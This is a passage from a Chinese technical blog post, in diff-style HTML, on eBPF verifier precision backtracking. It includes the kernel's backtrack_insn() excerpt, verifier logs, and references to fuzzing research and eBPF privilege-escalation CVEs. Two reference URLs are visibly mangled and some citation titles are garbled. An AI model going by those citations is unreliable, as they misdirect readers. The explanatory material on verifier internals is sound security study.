+<figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: R7_w=<span class="number">8</span> (<span class="keyword">R</span><span class="number">7</span>: <span class="keyword">P</span>)</span><br><span class="line"><span class="number">1</span>: R6_w=<span class="number">8</span> (<span class="keyword">R</span><span class="number">6</span>: <span class="keyword">P</span>)</span><br><span class="line"><span class="number">6</span>: fp<span class="number">-4</span>=<span class="number">8</span> (<span class="keyword">R</span><span class="number">6</span>: <span class="keyword">P</span>)</span><br><span class="line"><span class="number">10</span>: <span class="keyword">R</span><span class="number">0</span>=map_value(off=<span class="number">8</span>) (<span class="keyword">R</span><span class="number">6</span>: <span class="keyword">P</span>)</span><br><span class="line"><span class="number">11</span>: 访问 r<span class="number">0</span> + <span class="number">8</span>: 安全</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>r7</code> 的精确标记传播到 <code>r6</code>，确保 <code>r6 = 8</code> 在所有路径一致。</li>
+<li>偏移 8 等于映射值大小（8 字节），验证器确认安全（边界情况）。</li>
+</ul></li>
+</ul>
+<p>在<code>verifier</code>发现某个寄存器需要被标记为精确，<code>backtrack_insn()</code>会被调用，回溯指令以传播精确标记：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">backtrack_insn</span><span class="params">(<span class="keyword">struct</span> bpf_verifier_env *env, <span class="type">int</span> idx,</span></span><br><span class="line"><span class="params">			  u32 *reg_mask, u64 *stack_mask)</span></span><br><span class="line">{</span><br><span class="line">	.....</span><br><span class="line">	<span class="keyword">if</span> (insn-&gt;code == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (env-&gt;<span class="built_in">log</span>.level &amp; BPF_LOG_LEVEL2) {</span><br><span class="line">		verbose(env, <span class="string">"regs=%x stack=%llx before "</span>, *reg_mask, *stack_mask);</span><br><span class="line">		verbose(env, <span class="string">"%d: "</span>, idx);</span><br><span class="line">		print_bpf_insn(&amp;cbs, insn, env-&gt;allow_ptr_leaks);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (class == BPF_ALU || class == BPF_ALU64) {</span><br><span class="line">		<span class="keyword">if</span> (!(*reg_mask &amp; dreg))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (opcode == BPF_MOV) {</span><br><span class="line">			<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) {</span><br><span class="line">				<span class="comment">/* dreg = sreg</span></span><br><span class="line"><span class="comment">				 * dreg needs precision after this insn</span></span><br><span class="line"><span class="comment">				 * sreg needs precision before this insn</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">				*reg_mask &amp;= ~dreg;</span><br><span class="line">				*reg_mask |= sreg;</span><br><span class="line">			} <span class="keyword">else</span> {</span><br><span class="line">				<span class="comment">/* dreg = K</span></span><br><span class="line"><span class="comment">				 * dreg needs precision after this insn.</span></span><br><span class="line"><span class="comment">				 * Corresponding register is already marked</span></span><br><span class="line"><span class="comment">				 * as precise=true in this verifier state.</span></span><br><span class="line"><span class="comment">				 * No further markings in parent are necessary</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">				*reg_mask &amp;= ~dreg;</span><br><span class="line">			}</span><br><span class="line">		} <span class="keyword">else</span> {</span><br><span class="line">			.....</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>运行时示例输出如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">frame</span> <span class="number">0</span>: propagating r6</span><br><span class="line">  <span class="attribute">last_idx</span> <span class="number">9</span> first_idx <span class="number">0</span></span><br><span class="line">  <span class="attribute">regs</span>=<span class="number">40</span> stack=<span class="number">0</span> before <span class="number">6</span>: (bd) if r6 &lt;= r9 goto pc+<span class="number">2</span></span><br><span class="line">  <span class="attribute">regs</span>=<span class="number">40</span> stack=<span class="number">0</span> before <span class="number">5</span>: (<span class="number">05</span>) goto pc+<span class="number">0</span></span><br><span class="line">  <span class="attribute">regs</span>=<span class="number">40</span> stack=<span class="number">0</span> before <span class="number">4</span>: (<span class="number">97</span>) r6 %= <span class="number">1025</span></span><br><span class="line">  <span class="attribute">regs</span>=<span class="number">40</span> stack=<span class="number">0</span> before <span class="number">3</span>: (b7) r9 = -<span class="number">2147483648</span></span><br><span class="line">  <span class="attribute">regs</span>=<span class="number">40</span> stack=<span class="number">0</span> before <span class="number">2</span>: (b7) r8 = <span class="number">0</span></span><br><span class="line">  <span class="attribute">regs</span>=<span class="number">40</span> stack=<span class="number">0</span> before <span class="number">1</span>: (b7) r7 = <span class="number">0</span></span><br><span class="line">  <span class="attribute">regs</span>=<span class="number">40</span> stack=<span class="number">0</span> before <span class="number">0</span>: (b7) r6 = <span class="number">1024</span></span><br><span class="line">  <span class="attribute">from</span> <span class="number">6</span> to <span class="number">9</span>: safe</span><br></pre></td></tr></table></figure>
+<h2 id="参考文献">参考文献</h2>
+<ol type="1">
+<li>Hung, H. W., &amp; Sani, A. A. (2023). BRF: eBPF Runtime Fuzzer. <em>arXiv preprint arXiv:2305.08782</em>. https://arxiv.org/abs/2305.08782</li>
+<li>López Jaimez, J. J., &amp; Inge, M. (2023). Buzzer: An eBPF Fuzzing Framework. <em>Google Security Blog</em>. https://github.com/google/buzzer</li>
+<li>Zhou, S., Jiang, M., Chen, W., Zhou, H., Wang, H., &amp; Luo, X. (2024). Toss a Fault to BpfChecker: Revealing Implementation Flaws for eBPF runtimes with Differential Fuzzing. In <em>Proceedings of the 2024 ACM SIGSAC Conference on Computer and Communications Security</em> (pp. 939-950). ACM.</li>
+<li>Nelson, L., Van Geffen, J., Torlak, E., &amp; Wang, X. (2020). Specification and verification in the field: Applying formal methods to BPF just-in-time compilers in the Linux kernel. In <em>Proceedings of the 14th USENIX Conference on Operating Systems Design and Implementation</em> (OSDI '20). USENIX Association.</li>
+<li>Vishwanathan, H., Shachnai, M., Narayana, S., &amp; Nagarakatte, S. (2023). Automatically and formally proves the ranges analysis of the Linux verifier. In <em>Proceedings of the Computer Aided Verification Conference</em> (CAV '23).</li>
+<li>Sun, H., &amp; Su, Z. (2024). Devises a test oracle to fuzz the eBPF verifier. In <em>Proceedings of the 18th USENIX Symposium on Operating Systems Design and Implementation</em> (OSDI '24). USENIX Association.</li>
+<li>Krishna, P. (2024). Grammar-based Fuzzing of the eBPF Verifier for Security Testing. <em>Master's Thesis</em>, CISPA Helmholtz Center for Information Security.</li>
+<li>Zhang, P., Wu, C., Meng, X., Zhang, Y., Peng, M., Zhang, S., Hu, B., Xie, M., Lai, Y., Kang, Y., &amp; Wang, Z. (2024). SafeBPF: Hardware-assisted Defense-in-depth for eBPF. In <em>Proceedings of the IEEE Security and Privacy Conference</em> (SP '24).</li>
+<li>Paul, M. (2020). CVE-2020-8835: Linux Kernel Privilege Escalation via Improper eBPF Program Verification. <em>Zero Day Initiative Technical Report</em>. https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification</li>
+<li>Google Bug Hunters. (2023). A deep dive into CVE-2023-2163: How we found and fixed an eBPF Linux Kernel Vulnerability. <em>Google Security Blog</em>. https://bughunters.google.com/blog/6303226026131456/a-deep-dive-into-cve-2023-2163-how-we-found-and-fixed-an-ebpf-linux-kernel-vulnerability</li>
+<li>Bangladesh e-Government CIRT. (2022). Linux Kernel eBPF local privilege escalation (CVE-2022-23222) vulnerability. <em>Technical Advisory</em>. https://www.cirt.gov.bd/linux-kernel-ebpf-local-privilege-escalation-cve-2022-23222-vulnerability/</li>
+<li>Deep Kondah Security Research. (2024). Profiling Libraries With eBPF: Detecting Zero-Day Exploits and Backdoors - CVE-2021-31440 Analysis. <em>Technical Report</em>. https://www.deep-kondah.com/ebpf-library-profiling/</li>
+<li>IOVisor Community. (2019). bpf-fuzzer: Fuzzing framework based on libfuzzer and clang sanitizer. <em>GitHub Repository</em>. https://github.com/iovisor/bpf-fuzzer</li>
+<li>Snorez. (2020). ebpf-fuzzer: Fuzz the linux kernel bpf verifier. <em>GitHub Repository</em>. https://github.com/snorez/ebpf-fuzzer</li>
+<li>Google Security Research. (2023). Introducing a new way to buzz for eBPF vulnerabilities. <em>Google Security Blog</em>. https://security.googleblog.com/2023/05/introducing-new-way-to-buzz-for-ebpf.html</li>
+<li>Linux Kernel Community. (2024). eBPF Instruction Set Specification, v1.0. <em>The Linux Kernel Documentation</em>. https://docs.kernel.org/next/bpf/instruction-set.html</li>
+<li>Linux Kernel Community. (2024). eBPF verifier. <em>The Linux Kernel Documentation</em>. https://www.kernel.org/doc/html/v6.7/bpf/verifier.html</li>
+<li>Linux Kernel Community. (2024). BPF Documentation. <em>The Linux Kernel Documentation</em>. https://www.kernel.org/doc/html/latest/bpf/index.html</li>
+<li>eBPF Foundation. (2024). What is eBPF? An Introduction and Deep Dive into the eBPF Technology. <em>eBPF.io</em>. https://ebpf.io/what-is-ebpf/</li>
+<li>ControlPlane &amp; NCC Group. (2024). eBPF Security Threat Model and Verifier Code Audit. <em>eBPF Foundation Security Report</em>. https://www.linuxfoundation.org/press/threat-model-and-independent-verifier-audit-examine-the-security-of-ebpf</li>
+<li>Red Canary Threat Research Team. (2025). eBPF: A new frontier for malware. <em>Red Canary Security Research</em>. https://redcanary.com/blog/threat-detection/ebpf-malware/</li>
+<li>Liber, M. (2024). Understanding the Security Aspects of Linux eBPF. <em>Pentera Security Research</em>. https://pentera.io/blog/the-good-bad-and-compromisable-aspects-of-linux-ebpf/</li>
+<li>eBPF Foundation. (2024). Research Update: Isolated Execution Environment for eBPF. <em>eBPF Foundation Research Report</em>. https://ebpf.foundationebpf-verifierearch-update-isolated-execution-environment-for-ebpf/</li>
+<li>Tigera. (2024). eBPF Explained: Use Cases, Concepts, and Architecture. <em>Tigera Technical Guide</em>. https://www.tigera.io/learn/guides/ebpf/</li>
+<li>Red Hat. (2024). Analyzing system performance with eBPF. <em>Red Hat Enterprise Linux Documentation</em>. https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/managing_monitoring_and_updating_the_kernel/analyzing-system-performance-with-ebpf</li>
+<li>Eunomia-eBPF Community. (2024). The Evolution and Impact of eBPF: A list of Key Research Papers from Recent Years. <em>Technical Survey</em>. https://eunomia.dev/blogs/ebpf-papers/</li>
+<li>Alibaba Cloud. (2022). What You Need to Know About eBPF Security Observability. <em>Alibaba Cloud Technical Blog</em>. https://www.alibabacloud.com/blog/what-you-need-to-know-about-ebpf-security-observability_599614</li>
+<li>ricksanchez. (2024). Academic papers related to fuzzing, binary analysis, and exploit dev. <em>Paper Collection Repository</em>. https://github.com/0xricksanchez/paper_collection</li>
+<li>Chaigno, P. (2025). eBPF Research Papers. <em>Interactive Research Paper Database</em>. https://pchaigno.github.io/bpf/2025/01/07ebpf-verifierearch-papers-bpf.html</li>
+</ol>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2025/04/07/2025-SJTU-CTF/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">2025-SJTUCTF-PWN</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2025 晚栀wingee~
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
